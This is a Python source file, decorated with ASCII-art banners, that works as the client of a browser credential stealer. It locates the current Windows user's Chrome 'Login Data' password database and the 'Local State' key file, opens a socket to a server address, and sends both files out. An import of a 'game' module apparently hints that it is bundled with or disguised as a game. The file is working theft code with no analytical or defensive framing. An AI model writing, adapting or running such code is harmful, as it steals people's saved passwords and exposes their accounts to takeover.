'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|                                                                                                
   
                               ________  _________ ___________ _____ _____ 
                              |_   _|  \/  || ___ \  _  | ___ \_   _/  ___|
                                | | | .  . || |_/ / | | | |_/ / | | \ `--. 
                                | | | |\/| ||  __/| | | |    /  | |  `--. \
                               _| |_| |  | || |   \ \_/ / |\ \  | | /\__/ /
                               \___/\_|  |_/\_|    \___/\_| \_| \_/ \____/ 

'''

import socket
import os
from logins_hunt import *
from game import *

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|                                                                                                
   
                           _____ _____ _   _  _____ _____ ___   _   _ _____ _____ 
                          /  __ \  _  | \ | |/  ___|_   _/ _ \ | \ | |_   _/  ___|
                          | /  \/ | | |  \| |\ `--.  | |/ /_\ \|  \| | | | \ `--. 
                          | |   | | | | . ` | `--. \ | ||  _  || . ` | | |  `--. \
                          | \__/\ \_/ / |\  |/\__/ / | || | | || |\  | | | /\__/ /
                           \____/\___/\_| \_/\____/  \_/\_| |_/\_| \_/ \_/ \____/ 

'''

USERNAME: str = os.environ.get('USERNAME')
LOGIN_DATA_FILE_PATH: str = f'C:\\Users\\{USERNAME}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
LOCAL_STATE_FILE_PATH: str = f'C:\\Users\\{USERNAME}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|                                                                                                
                                                                                     
______  ___ _____ ___  ______  ___   _____ _____ _____   ___________  ___   _   _  ___________ ___________ 
|  _  \/ _ \_   _/ _ \ | ___ \/ _ \ /  ___|  ___/  ___| |_   _| ___ \/ _ \ | \ | |/  ___|  ___|  ___| ___ \
| | | / /_\ \| |/ /_\ \| |_/ / /_\ \\ `--.| |__ \ `--.    | | | |_/ / /_\ \|  \| |\ `--.| |_  | |__ | |_/ /
| | | |  _  || ||  _  || ___ \  _  | `--. \  __| `--. \   | | |    /|  _  || . ` | `--. \  _| |  __||    / 
| |/ /| | | || || | | || |_/ / | | |/\__/ / |___/\__/ /   | | | |\ \| | | || |\  |/\__/ / |   | |___| |\ \ 
|___/ \_| |_/\_/\_| |_/\____/\_| |_/\____/\____/\____/    \_/ \_| \_\_| |_/\_| \_/\____/\_|   \____/\_| \_|
'''
                                                                            
def client_transfer_databases(client_socket: socket.socket) -> None:
    with open(LOGIN_DATA_FILE_PATH, BINARY_FILE_READ) as file:
        while True:
            data = file.read(BYTES_TO_READ)
            if not data:
                client_socket.sendall(DATA_END_MESSAGE)
                break
            client_socket.sendall(data)
        
    with open(LOCAL_STATE_FILE_PATH, BINARY_FILE_READ) as file:
        while True:
            data = file.read(BYTES_TO_READ)
            if not data:
                break
            client_socket.sendall(data)

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|    

                                        ___  ___  ___  _____ _   _ 
                                        |  \/  | / _ \|_   _| \ | |
                                        | .  . |/ /_\ \ | | |  \| |
                                        | |\/| ||  _  | | | | . ` |
                                        | |  | || | | |_| |_| |\  |
                                        \_|  |_/\_| |_/\___/\_| \_/

'''

def main() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(SERVER_ADDRESS)
        client_transfer_databases(client_socket)

if __name__ == "__main__":
    main()

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''